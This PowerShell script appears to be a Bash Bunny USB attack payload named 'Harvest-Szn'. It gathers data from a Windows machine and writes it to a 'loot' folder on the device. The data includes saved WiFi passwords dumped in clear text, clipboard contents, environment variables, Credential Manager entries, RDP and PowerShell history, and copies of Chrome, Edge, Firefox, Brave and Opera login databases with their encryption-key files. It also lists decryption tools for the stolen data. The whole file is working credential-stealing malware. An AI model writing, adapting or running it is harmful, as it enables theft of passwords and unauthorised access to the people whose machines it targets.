$drivelabel = 'BashBunny'
$volume = Get-WmiObject win32_volume -Filter "label='$drivelabel'"

if ($volume) {
    # Define the specific output directory
    $outputDir = Join-Path -Path $volume.Name -ChildPath 'loot\Harvest-Szn'
    $outputFile = Join-Path -Path $outputDir -ChildPath "system_info_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    $errorFile = Join-Path -Path $outputDir -ChildPath "errors_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

    # Ensure the Loot Directory Exists
    if (-not (Test-Path $outputDir)) {
        try {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
            "Created directory: $outputDir"
        } catch {
            "ERROR: Failed to create directory '$outputDir'. Error: $($_.Exception.Message)"
            exit 1
        }
    }

    # Start collecting information
    "Collecting system information..."
    
    # Create output array
    $output = @()
    $errors = @()

    # Function to handle errors
    function Log-Error {
        param([string]$Message)
        $errors += "[ERROR] $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $Message"
        $errors += "  Exception: $($_.Exception.Message)"
        $errors += "  Stack Trace: $($_.ScriptStackTrace)"
        $errors += ""
    }

    # Computer Information
    $output += "=========================================="
    $output += "COMPUTER INFORMATION"
    $output += "=========================================="
    $output += ""
    
    try {
        # System Information
        $computerInfo = Get-ComputerInfo
        $output += "Computer Name: $($computerInfo.CsName)"
        $output += "OS Name: $($computerInfo.WindowsProductName)"
        $output += "OS Version: $($computerInfo.WindowsVersion)"
        $output += "OS Build: $($computerInfo.WindowsBuildLabEx)"
        $output += "Manufacturer: $($computerInfo.CsManufacturer)"
        $output += "Model: $($computerInfo.CsModel)"
        $output += "Total Physical Memory: $([math]::Round($computerInfo.CsTotalPhysicalMemory/1GB, 2)) GB"
        $output += "Number of Processors: $($computerInfo.CsNumberOfProcessors)"
        $output += "Number of Logical Processors: $($computerInfo.CsNumberOfLogicalProcessors)"
        $output += ""
    } catch {
        $errorMsg = "Failed to get computer info: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }

    # Network Information
    try {
        $output += "Network Information:"
        $networkAdapters = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}
        foreach ($adapter in $networkAdapters) {
            $output += "  Adapter: $($adapter.Name)"
            $output += "  MAC Address: $($adapter.MacAddress)"
            $output += "  Status: $($adapter.Status)"
            $output += ""
        }
        
        # IP Configuration
        $ipConfig = Get-NetIPConfiguration
        foreach ($config in $ipConfig) {
            $output += "  Interface: $($config.InterfaceAlias)"
            $output += "  IPv4 Address: $($config.IPv4Address.IPAddress)"
            $output += "  Subnet Mask: $($config.IPv4Address.PrefixLength)"
            $output += "  Gateway: $($config.IPv4DefaultGateway.NextHop)"
            $output += "  DNS Servers: $($config.DNSServer.ServerAddresses -join ', ')"
            $output += ""
        }
    } catch {
        $errorMsg = "Failed to get network info: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }

    # Local Users
    $output += "=========================================="
    $output += "LOCAL USERS"
    $output += "=========================================="
    $output += ""
    
    try {
        $localUsers = Get-LocalUser
        foreach ($user in $localUsers) {
            $output += "Username: $($user.Name)"
            $output += "  Full Name: $($user.FullName)"
            $output += "  Enabled: $($user.Enabled)"
            $output += "  Last Logon: $($user.LastLogon)"
            $output += "  Password Changeable: $($user.PasswordChangeable)"
            $output += "  Password Expires: $($user.PasswordExpires)"
            $output += "  User May Change Password: $($user.UserMayChangePassword)"
            $output += "  Password Required: $($user.PasswordRequired)"
            $output += "  SID: $($user.SID)"
            $output += ""
        }
    } catch {
        $errorMsg = "Failed to get local users: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }

    # Local Groups
    $output += "=========================================="
    $output += "LOCAL GROUPS"
    $output += "=========================================="
    $output += ""
    
    try {
        $localGroups = Get-LocalGroup
        foreach ($group in $localGroups) {
            $output += "Group: $($group.Name)"
            $output += "  SID: $($group.SID)"
            $output += "  Description: $($group.Description)"
            
            # Get group members
            $members = Get-LocalGroupMember -Group $group.Name -ErrorAction SilentlyContinue
            if ($members) {
                $output += "  Members:"
                foreach ($member in $members) {
                    $output += "    - $($member.Name) ($($member.ObjectClass))"
                }
            } else {
                $output += "  Members: None"
            }
            $output += ""
        }
    } catch {
        $errorMsg = "Failed to get local groups: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }

    # WiFi Networks and Passwords
    $output += "=========================================="
    $output += "WIFI NETWORKS AND PASSWORDS"
    $output += "=========================================="
    $output += ""
    
    try {
        # Check if WiFi is available
        $wifiAdapter = Get-NetAdapter | Where-Object {$_.InterfaceDescription -like "*Wireless*" -or $_.InterfaceDescription -like "*Wi-Fi*" -or $_.Name -like "*Wi-Fi*"}
        
        if ($wifiAdapter) {
            "WiFi adapter detected. Retrieving saved networks..."
            
            # Get all WiFi profiles
            $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
                $_.ToString().Split(":")[1].Trim()
            }
            
            if ($profiles) {
                $output += "Saved WiFi Networks:"
                $output += ""
                
                foreach ($profile in $profiles) {
                    $output += "SSID: $profile"
                    
                    # Get profile details including password
                    $profileInfo = netsh wlan show profile name="$profile" key=clear
                    
                    # Extract security type
                    $security = $profileInfo | Select-String "Authentication" | ForEach-Object {
                        $_.ToString().Split(":")[1].Trim()
                    }
                    $output += "  Security: $security"
                    
                    # Extract password/key content
                    $keyContent = $profileInfo | Select-String "Key Content" | ForEach-Object {
                        $_.ToString().Split(":")[1].Trim()
                    }
                    
                    if ($keyContent) {
                        $output += "  Password: $keyContent"
                    } else {
                        $output += "  Password: (No password stored or not available)"
                    }
                    
                    # Extract connection mode
                    $connectionMode = $profileInfo | Select-String "Connection mode" | ForEach-Object {
                        $_.ToString().Split(":")[1].Trim()
                    }
                    $output += "  Connection Mode: $connectionMode"
                    
                    $output += ""
                }
            } else {
                $output += "No saved WiFi profiles found."
                $output += ""
            }
            
            # Get current connection info
            $currentConnection = netsh wlan show interfaces
            $currentSSID = $currentConnection | Select-String "SSID" | Select-Object -First 1 | ForEach-Object {
                $_.ToString().Split(":")[1].Trim()
            }
            
            if ($currentSSID -and $currentSSID -ne "") {
                $output += "Currently Connected To: $currentSSID"
                $output += ""
            }
        } else {
            $output += "No WiFi adapter detected or WiFi is disabled."
            $output += ""
        }
    } catch {
        $errorMsg = "Failed to get WiFi info: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }

    # Clipboard Information
    $output += "=========================================="
    $output += "CLIPBOARD INFORMATION"
    $output += "=========================================="
    $output += ""
    
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        if ([System.Windows.Forms.Clipboard]::ContainsText()) {
            $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
            $output += "Clipboard Text Content:"
            $output += "$clipboardText"
        } else {
            $output += "Clipboard does not contain text or is empty."
        }
    } catch {
        $errorMsg = "Unable to access clipboard: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }
    $output += ""

    # Environment Variables
    $output += "=========================================="
    $output += "ENVIRONMENT VARIABLES"
    $output += "=========================================="
    $output += ""
    
    try {
        $output += "User Environment Variables:"
        Get-ChildItem Env: | Sort-Object Name | ForEach-Object {
            $output += "  $($_.Name) = $($_.Value)"
        }
    } catch {
        $errorMsg = "Failed to get environment variables: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }
    $output += ""

    # Browser Login Data (Chrome, Edge, Firefox)
$output += "=========================================="
$output += "BROWSER LOGIN DATA"
$output += "=========================================="
$output += ""

# Function to extract AND COPY browser credentials
function Get-BrowserCredentials {
    param(
        [string]$BrowserName,
        [string]$LoginDataPath,
        [string]$LocalStatePath,
        [string]$OutputDir
    )
    
    $browserOutput = @()
    
    if (Test-Path $LoginDataPath) {
        $browserOutput += "${BrowserName} Login Data Found at: ${LoginDataPath}"
        
        try {
            # Create browser-specific directory in loot
            $browserLootDir = Join-Path $OutputDir $BrowserName.Replace(" ", "_")
            if (-not (Test-Path $browserLootDir)) {
                New-Item -Path $browserLootDir -ItemType Directory -Force | Out-Null
            }
            
            # Copy the Login Data file
            $destLoginData = Join-Path $browserLootDir "Login_Data"
            Copy-Item -Path $LoginDataPath -Destination $destLoginData -Force -ErrorAction Stop
            $browserOutput += "  Copied to: $destLoginData"
            
            # If Chrome/Edge, also copy Local State file (contains encryption key)
            if ($LocalStatePath -and (Test-Path $LocalStatePath)) {
                $destLocalState = Join-Path $browserLootDir "Local_State"
                Copy-Item -Path $LocalStatePath -Destination $destLocalState -Force -ErrorAction Stop
                $browserOutput += "  Local State copied to: $destLocalState"
            }
            
            # Try to read basic info from the database (without decryption)
            try {
                # This just shows the file exists and size - actual decryption requires tools
                $fileInfo = Get-Item $LoginDataPath
                $browserOutput += "  File Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB"
                $browserOutput += "  Last Modified: $($fileInfo.LastWriteTime)"
            } catch {
                $browserOutput += "  Could not read file info: $($_.Exception.Message)"
            }
            
        } catch {
            $errorMsg = "Browser ${BrowserName}: Failed to copy files - $($_.Exception.Message)"
            $browserOutput += "  Error: $($_.Exception.Message)"
            Log-Error -Message $errorMsg
        }
    } else {
        $browserOutput += "${BrowserName}: Login data not found at ${LoginDataPath}"
    }
    
    return $browserOutput
}

try {
    # Chrome
    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $chromeOutput = Get-BrowserCredentials -BrowserName "Google Chrome" -LoginDataPath $chromeLoginData -LocalStatePath $chromeLocalState -OutputDir $outputDir
    $output += $chromeOutput
    
    # Edge
    $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    $edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    $edgeOutput = Get-BrowserCredentials -BrowserName "Microsoft Edge" -LoginDataPath $edgeLoginData -LocalStatePath $edgeLocalState -OutputDir $outputDir
    $output += $edgeOutput
    
    # Firefox 
    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfiles) {
        $firefoxProfile = Get-ChildItem $firefoxProfiles -Filter "*.default*" -Directory | Select-Object -First 1
        if ($firefoxProfile) {
            $firefoxLogins = Join-Path $firefoxProfile.FullName "logins.json"
            $firefoxKeyDB = Join-Path $firefoxProfile.FullName "key4.db"
            $firefoxCertDB = Join-Path $firefoxProfile.FullName "cert9.db"
            
            $output += "Firefox Profile Found: $($firefoxProfile.Name)"
            
            # Create Firefox loot directory
            $firefoxLootDir = Join-Path $outputDir "Firefox"
            if (-not (Test-Path $firefoxLootDir)) {
                New-Item -Path $firefoxLootDir -ItemType Directory -Force | Out-Null
            }
            
            # Copy Firefox files
            $firefoxFiles = @($firefoxLogins, $firefoxKeyDB, $firefoxCertDB)
            foreach ($file in $firefoxFiles) {
                if (Test-Path $file) {
                    $destFile = Join-Path $firefoxLootDir (Split-Path $file -Leaf)
                    try {
                        Copy-Item -Path $file -Destination $destFile -Force -ErrorAction Stop
                        $output += "  Copied $(Split-Path $file -Leaf) to: $destFile"
                    } catch {
                        $output += "  Failed to copy $(Split-Path $file -Leaf): $($_.Exception.Message)"
                    }
                }
            }
            
            $output += "  Note: To decrypt these files later:

	You'll need tools like:

   	 Chrome/Edge: SharpChrome, LaZagne, or ChromeDecryptor
    	Firefox: firefox_decrypt.py, LaZagne, or FirefoxDecrypt
    	Or use SQLite browsers to manually examine the databases
	"
        }
    }
    
    # Additional browser checks
    $output += ""
    $output += "Additional Browser Checks:"
    
    # Check for Brave
    $braveLoginData = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    if (Test-Path $braveLoginData) {
        $output += "Brave Browser: Login Data found"
        $braveLootDir = Join-Path $outputDir "Brave"
        if (-not (Test-Path $braveLootDir)) {
            New-Item -Path $braveLootDir -ItemType Directory -Force | Out-Null
        }
        Copy-Item -Path $braveLoginData -Destination (Join-Path $braveLootDir "Login_Data") -Force -ErrorAction SilentlyContinue
    }
    
    # Check for Opera
    $operaLoginData = "$env:APPDATA\Opera Software\Opera Stable\Login Data"
    if (Test-Path $operaLoginData) {
        $output += "Opera Browser: Login Data found"
        $operaLootDir = Join-Path $outputDir "Opera"
        if (-not (Test-Path $operaLootDir)) {
            New-Item -Path $operaLootDir -ItemType Directory -Force | Out-Null
        }
        Copy-Item -Path $operaLoginData -Destination (Join-Path $operaLootDir "Login_Data") -Force -ErrorAction SilentlyContinue
    }
    
} catch {
    $errorMsg = "Failed to get browser data: $($_.Exception.Message)"
    $output += $errorMsg
    Log-Error -Message $errorMsg
}
$output += ""

    # Saved Credentials (Windows Credential Manager) 
    $output += "=========================================="
    $output += "WINDOWS CREDENTIAL MANAGER"
    $output += "=========================================="
    $output += ""
    
    try {
        # Check for cmdkey entries
        $cmdkeyOutput = cmdkey /list 2>$null
        if ($cmdkeyOutput) {
            $output += "Stored Credentials (cmdkey /list):"
            $output += $cmdkeyOutput
        } else {
            $output += "No credentials found via cmdkey."
        }
    } catch {
        $errorMsg = "Error accessing credential manager: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }
    $output += ""
    
    # Check for generic credentials in registry
    try {
        $output += "Generic Credentials from Registry:"
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains"
        if (Test-Path $regPath) {
            $domains = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($domain in $domains) {
                $output += "  Domain: $($domain.PSChildName)"
            }
        }
    } catch {
        $errorMsg = "Failed to get registry credentials: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }
    $output += ""

    # RDP Connections History
    $output += "=========================================="
    $output += "RDP CONNECTION HISTORY"
    $output += "=========================================="
    $output += ""
    
    try {
        $rdpMRU = "HKCU:\Software\Microsoft\Terminal Server Client\Default"
        if (Test-Path $rdpMRU) {
            $rdpEntries = Get-ItemProperty $rdpMRU -ErrorAction SilentlyContinue
            $output += "Recent RDP Connections:"
            $rdpEntries.PSObject.Properties | Where-Object {$_.Name -match '^MRU'} | ForEach-Object {
                $output += "  $($_.Name): $($_.Value)"
            }
        } else {
            $output += "No RDP connection history found."
        }
    } catch {
        $errorMsg = "Failed to get RDP history: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }
    $output += ""

    # Additional System Information
    $output += "=========================================="
    $output += "ADDITIONAL SYSTEM INFORMATION"
    $output += "=========================================="
    $output += ""
    
    # Running processes
    try {
        $output += "Top 20 Processes by Memory Usage:"
        $processes = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 20
        foreach ($process in $processes) {
            $output += "  $($process.ProcessName) - PID: $($process.Id) - Memory: $([math]::Round($process.WorkingSet/1MB, 2)) MB"
        }
    } catch {
        $errorMsg = "Failed to get processes: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }
    $output += ""
    
    # Services
    try {
        $output += "Services (Running):"
        $services = Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 15
        foreach ($service in $services) {
            $output += "  $($service.DisplayName) - $($service.Name) - Status: $($service.Status)"
        }
    } catch {
        $errorMsg = "Failed to get services: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }
    $output += ""
    
    # Installed software
    try {
    $output += "Recently Installed Software (Last 30 days):"
    
    $registryPaths = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall",
        "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    )
    
    $recentSoftware = @()
    
    foreach ($path in $registryPaths) {
        if (Test-Path $path) {
            $apps = Get-ItemProperty -Path "$path\*" -ErrorAction SilentlyContinue
            
            foreach ($app in $apps) {
                if ($app.InstallDate) {
                    # Registry dates are usually in YYYYMMDD format
                    try {
                        $installDate = [DateTime]::ParseExact($app.InstallDate, "yyyyMMdd", $null)
                        
                        if ($installDate -gt (Get-Date).AddDays(-30)) {
                            $recentSoftware += [PSCustomObject]@{
                                Name = $app.DisplayName
                                Version = $app.DisplayVersion
                                InstallDate = $installDate.ToString("yyyy-MM-dd")
                            }
                        }
                    } catch {
                        # Try other date formats
                        try {
                            $installDate = [DateTime]$app.InstallDate
                            if ($installDate -gt (Get-Date).AddDays(-30)) {
                                $recentSoftware += [PSCustomObject]@{
                                    Name = $app.DisplayName
                                    Version = $app.DisplayVersion
                                    InstallDate = $installDate.ToString("yyyy-MM-dd")
                                }
                            }
                        } catch {
                            continue
                        }
                    }
                }
            }
        }
    }
    
    if ($recentSoftware.Count -gt 0) {
        foreach ($app in $recentSoftware) {
            $output += "  $($app.Name) - Version: $($app.Version) - Installed: $($app.InstallDate)"
        }
    } else {
        $output += "  No software installed in the last 30 days"
    }
} catch {
    $errorMsg = "Failed to get installed software: $($_.Exception.Message)"
    $output += $errorMsg
    Log-Error -Message $errorMsg
}
$output += ""

    # PowerShell History
    $output += "=========================================="
    $output += "POWERSHELL HISTORY"
    $output += "=========================================="
    $output += ""
    
    try {
        $psHistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $psHistoryPath) {
            $output += "PowerShell Command History (last 50 commands):"
            $history = Get-Content $psHistoryPath -Tail 50 -ErrorAction Stop
            foreach ($line in $history) {
                $output += "  $line"
            }
        } else {
            $output += "No PowerShell history file found."
        }
    } catch {
        $errorMsg = "Failed to get PowerShell history: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }
    $output += ""

    # Save all information to file on Bash Bunny
    try {
        $output | Out-File -FilePath $outputFile -Encoding UTF8
        "System information saved to: $outputFile"
        
        # Save errors to separate file
        if ($errors.Count -gt 0) {
            $errors | Out-File -FilePath $errorFile -Encoding UTF8
            "Errors saved to: $errorFile"
        }
        
        # Also display WiFi passwords separately for quick reference
        $wifiFile = Join-Path -Path $outputDir -ChildPath "wifi_passwords_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $wifiOutput = $output | Select-String -Pattern "SSID:|Password:" | ForEach-Object { $_.ToString() }
        if ($wifiOutput) {
            $wifiOutput | Out-File -FilePath $wifiFile -Encoding UTF8
            "WiFi passwords saved to: $wifiFile"
        }
        
        # Save browser data locations separately
        $browserFile = Join-Path -Path $outputDir -ChildPath "browser_data_locations_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $browserOutput = $output | Select-String -Pattern "Browser|Chrome|Edge|Firefox|Login Data|logins.json|key4.db" | ForEach-Object { $_.ToString() }
        if ($browserOutput) {
            $browserOutput | Out-File -FilePath $browserFile -Encoding UTF8
            "Browser data locations saved to: $browserFile"
        }
        
    } catch {
        $errorMsg = "Failed to save information to file: $($_.Exception.Message)"
        $output += $errorMsg
        Log-Error -Message $errorMsg
    }

    # Output everything to stdout for Bash Bunny capture
    $output

    # Output errors if any
    if ($errors.Count -gt 0) {
        ""
        "=== ERRORS ENCOUNTERED ==="
        $errors
    }

} else {
    "ERROR: Drive labeled '$drivelabel' not found."
    exit 1
}

"Information collection completed successfully!"
